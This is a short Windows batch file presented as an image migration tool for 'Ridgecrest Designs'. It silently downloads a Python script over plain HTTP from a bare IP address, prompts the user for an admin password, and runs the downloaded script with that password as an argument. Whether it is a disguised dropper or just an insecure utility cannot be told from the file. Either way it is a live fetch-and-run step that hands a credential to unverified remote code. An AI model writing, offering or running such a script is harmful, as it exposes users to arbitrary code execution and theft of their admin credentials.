@echo off
echo ============================================
echo  Ridgecrest Designs - Image Migration Tool
echo ============================================
echo.
echo Downloading migration script...
curl.exe -s -o "%TEMP%\migrate_images.py" "http://147.182.242.54:8081/migrate_images.py"
if %errorlevel% neq 0 (
    echo ERROR: Could not download script. Check your internet connection.
    pause
    exit /b 1
)
set /p RDPW=Enter admin password:
echo.
echo Running migration...
echo.
python "%TEMP%\migrate_images.py" "%RDPW%"
echo.
echo Done. Press any key to close.
pause >nul
